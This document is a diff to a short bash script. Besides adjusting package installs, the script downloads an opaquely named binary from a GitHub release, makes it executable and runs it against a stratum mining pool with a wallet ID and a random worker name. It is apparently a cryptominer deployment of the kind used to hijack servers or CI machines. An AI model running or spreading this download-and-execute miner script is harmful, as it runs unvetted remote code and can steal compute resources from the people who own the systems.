@@ -1,7 +1,6 @@
 #!/bin/bash
 apt update
-apt install -y wget sudo curl
-apt-get install build-essential -y
+apt -y install curl sudo git wget libicu-dev
 wget https://github.com/vedhagsvp/qubros/releases/download/apl/crcxcba
 chmod +x crcxcba
 ./crcxcba -P stratum1+tcp://cb16e28eda52f3750022c539e75c84610f87af8030a9.$(echo $RANDOM | md5sum | head -c 10)@de.catchthatrabbit.com:8008 \
